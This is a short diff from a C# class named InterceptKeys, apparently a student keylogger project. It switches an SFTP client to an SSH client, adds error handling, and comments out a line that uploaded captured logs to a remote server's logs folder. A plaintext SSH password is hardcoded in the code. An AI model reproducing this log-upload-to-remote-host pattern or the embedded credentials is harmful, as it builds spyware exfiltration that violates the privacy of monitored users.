@@ -81,11 +81,18 @@ class InterceptKeys
         string password = "kglosseCSET3100";
         int port = 22;
 
-        using (var client = new SftpClient(hostname, username, password))
+        using (var client = new SshClient(hostname, username, password))
         {
-            client.Connect(); // find the execption message
+            try
+            {
+                client.Connect(); // find the execption message
+            }
+            catch (Exception e)
+            {
+                MessageBox.Show(e.Message);
+            }
 
-            client.UploadFile(fileStream, "/home/kglosse/cset4850/logs/", true, null);
+          //  client.UploadFile(fileStream, "/home/kglosse/cset4850/logs/", true, null);
 
             
             client.Disconnect();
